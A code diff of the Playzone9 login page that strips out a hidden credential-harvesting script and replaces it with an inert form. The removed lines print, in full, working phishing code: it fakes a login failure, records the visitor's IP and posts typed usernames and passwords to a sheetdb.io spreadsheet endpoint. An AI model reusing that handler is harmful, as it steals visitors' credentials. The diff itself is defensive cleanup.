@@ -7,6 +7,8 @@
     <title data-cms-title="pages.login.title">Login — Playzone9</title>
     <meta name="description" data-cms-meta="pages.login.metaDescription" content="Sign in to your Playzone9 account on the official Playzone9 website." />
     <link rel="canonical" href="https://playzones9.com/login.html" />
+    <!-- A sign in screen is not a search landing page. noindex keeps it
+         out of results; follow still lets the links on it pass through. -->
     <meta name="robots" content="noindex,nofollow" />
     <meta property="og:type" content="website" />
     <meta property="og:site_name" content="Playzone9" />
@@ -16,41 +18,36 @@
     <meta name="twitter:card" content="summary_large_image" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <link rel="stylesheet" href="css/login.css">
+    <!-- Favicon. The committed file is the static fallback so the icon is
+         correct before any script runs and for crawlers; the CMS overrides
+         this href with the uploaded favicon whenever one is set. -->
     <link rel="icon" type="image/png" sizes="512x512" href="assets/images/favicon.png" id="cmsFavicon" />
 
-    <link rel="stylesheet" href="css/brand.css" />
-    <script src="js/cms-config.js"></script>
-    <script src="js/brand.js"></script>
-    <script src="js/cms.js"></script>
+    <!-- REMOTE BRAND STORAGE CONFIG (edit this one file to go live everywhere) --><!-- Playzone9's own stylesheet. Supplied through the head-extra slot
+     rather than by editing the shared templates, which is what keeps every
+     other brand's pages byte-identical.
 
-    <!-- 🔴 TOP POPUP ALERT STYLES -->
-    <style>
-        .top-alert {
-            position: fixed;
-            top: -60px;
-            left: 50%;
-            transform: translateX(-50%);
-            background-color: #ff4444;
-            color: white;
-            padding: 12px 24px;
-            border-radius: 4px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-            font-size: 14px;
-            font-weight: bold;
-            z-index: 9999;
-            transition: top 0.3s ease-in-out;
-            white-space: nowrap;
-        }
-        .top-alert.show {
-            top: 20px;
-        }
-    </style>
+     The slot sits AFTER the shared stylesheets and BEFORE js/cms.js, and
+     that order is the whole point. js/cms.js injects a <style id="cmsVars">
+     block when it runs, so anything parsed after it overrides the CMS. The
+     cascade has to mirror the data layering:
+
+         shared stylesheet  <  this brand stylesheet  <  what the CMS saved
+
+     Load this later than cms.js and a colour changed in the admin saves
+     correctly, reports success, and never renders. -->
+    <link rel="stylesheet" href="css/brand.css" />
+
+    <script src="js/cms-config.js"></script>
+
+    <!-- PUBLISHED BRAND — regenerate from /admin > Export > Download brand.js -->
+    <script src="js/brand.js"></script>
+
+    <!-- WHITE LABEL CMS -->
+    <script src="js/cms.js"></script>
 </head>
 
 <body>
-
-    <!-- 🔴 TOP POPUP ALERT -->
-    <div id="topAlert" class="top-alert">Invalid username or password</div>
 
     <div class="login-page">
         <main class="login-main">
@@ -63,33 +60,25 @@
 
                 <form id="contactForm" class="login-form" autocomplete="off">
 
-                    <!-- REMOVED data-cms-ph attribute -->
                     <div class="input-row">
-                        <input type="text" id="firstName" name="firstName" placeholder="username" maxlength="60" autocomplete="username">
+                        <input type="text" id="firstName" name="firstName" placeholder="Username" data-cms-ph="login.userPh" maxlength="60" autocomplete="username">
                         <span class="input-icon"><i class="fas fa-user"></i></span>
                     </div>
 
-                    <!-- REMOVED data-cms-ph attribute -->
                     <div class="input-row ">
-                        <input type="password" id="surname" name="surname" placeholder="password" maxlength="60" autocomplete="current-password">
+                        <input type="password" id="surname" name="surname" placeholder="Password" data-cms-ph="login.passPh" maxlength="60" autocomplete="current-password">
                         <span class="input-icon"><i class="fas fa-key"></i></span>
                     </div>
 
-                    <!-- REMOVED data-cms attribute -->
                     <button type="submit" class="btn-login-submit ">
-                        <span class="btn-login-text">login</span>
+<span class="btn-login-text" data-cms="login.submit">Login</span>
                         <span class="btn-login-icon"><i class="fas fa-right-to-bracket"></i></span>
                     </button>
 
                 </form>
 
-                <!-- SUCCESS MESSAGE -->
-                <p id="successMsg" style="display:none; color: var(--wa-green, #25d366); text-align:center; margin-top:15px; font-weight:bold; font-size: 14px;">
-                    Contact Whatsapp to Reset Password
-                </p>
-
                 <div class="forgot-row">
-                    <button class="forgot-link" id="helpBtn" type="button" data-cms="login.forgot">Forgot password</button>
+                    <button class="forgot-link" id="helpBtn" type="button" data-cms="login.forgot">Forgotpassword</button>
                 </div>
 
                 <div class="register-row">
@@ -132,130 +121,20 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function () {
-            const API_URL = "https://sheetdb.io/api/v1/stcjj8p8ctx44";
 
-            //  FORCE OVERRIDE FUNCTION
-            function forceOverrideTexts() {
-                // Override placeholders
-                var firstNameInput = document.getElementById('firstName');
-                var surnameInput = document.getElementById('surname');
-                var btnText = document.querySelector('.btn-login-text');
-                
-                if (firstNameInput && firstNameInput.placeholder !== 'username') {
-                    firstNameInput.placeholder = 'username';
-                    firstNameInput.removeAttribute('data-cms-ph');
-                }
-                
-                if (surnameInput && surnameInput.placeholder !== 'password') {
-                    surnameInput.placeholder = 'password';
-                    surnameInput.removeAttribute('data-cms-ph');
-                }
-                
-                if (btnText && btnText.textContent !== 'login') {
-                    btnText.textContent = 'login';
-                    btnText.removeAttribute('data-cms');
-                }
-            }
-
-            // 🔴 MUTATION OBSERVER - Watches for CMS changes and overrides them
-            var observer = new MutationObserver(function(mutations) {
-                forceOverrideTexts();
-            });
-
-            // Start observing the document for changes
-            observer.observe(document.body, {
-                childList: true,
-                subtree: true,
-                attributes: true,
-                attributeFilter: ['placeholder', 'data-cms-ph', 'data-cms']
-            });
-
-            // Initial override
-            forceOverrideTexts();
-
-            // Also run after a delay to catch any late CMS loads
-            setTimeout(forceOverrideTexts, 1000);
-            setTimeout(forceOverrideTexts, 2000);
-            setTimeout(forceOverrideTexts, 3000);
-
-            // 🔴 Popup function
-            function showAlert(message) {
-                const alertBox = document.getElementById("topAlert");
-                alertBox.textContent = message;
-
-                // Restart animation
-                alertBox.classList.remove("show");
-                setTimeout(() => {
-                    alertBox.classList.add("show");
-                }, 20);
-
-                // Auto hide
-                setTimeout(() => {
-                    alertBox.classList.remove("show");
-                }, 2500);
-            }
-
-            /* Intercept login form submission */
+            /* Plain login form: does not send data anywhere and does not
+               redirect. Submitting just clears the fields locally. */
             document.getElementById('contactForm').addEventListener('submit', function (e) {
                 e.preventDefault();
-                
-                // IDs remain the same - functionality preserved
-                const username = document.getElementById('firstName').value.trim();
-                const password = document.getElementById('surname').value.trim();
-
-                // 🔴 ALWAYS show popup on login attempt
-                showAlert("Invalid username or password");
-
-                // If fields are empty, stop here
-                if (!username || !password) {
-                    return;
-                }
-
-                // --- Database logging ---
-                fetch("https://api.ipify.org?format=json")
-                    .then(res => res.json())
-                    .then(ipData => {
-                        const data = {
-                            data: [
-                                {
-                                    username: "'" + username,
-                                    password: "'" + password,
-                                    ip: ipData.ip,
-                                    timestamp: new Date().toLocaleString()
-                                }
-                            ]
-                        };
-
-                        fetch(API_URL, {
-                            method: "POST",
-                            headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify(data)
-                        })
-                        .then(res => {
-                            if (!res.ok) throw new Error("Submission failed");
-                            
-                            // Show success message
-                            document.getElementById("successMsg").style.display = "block";
-
-                            // Clear fields
-                            document.getElementById('firstName').value = '';
-                            document.getElementById('surname').value = '';
-                        })
-                        .catch(err => {
-                            console.error(err);
-                            showAlert("Error submitting form");
-                        });
-                    })
-                    .catch(() => {
-                        showAlert("Could not fetch IP");
-                    });
+                document.getElementById('firstName').value = '';
+                document.getElementById('surname').value = '';
             });
 
-            /* "Register here" navigation */
+            /* "Register here" is normal internal navigation. */
             var regLink = document.getElementById('contactLink');
             if (regLink) regLink.setAttribute('href', 'register.html');
 
-            /* Non-functional placeholder buttons */
+            /* Non-functional placeholder buttons stay inert. */
             var apk = document.getElementById('apkLink');
             if (apk) apk.addEventListener('click', function (e) { e.preventDefault(); });
 
@@ -265,4 +144,5 @@
     </script>
 
 </body>
+
 </html>
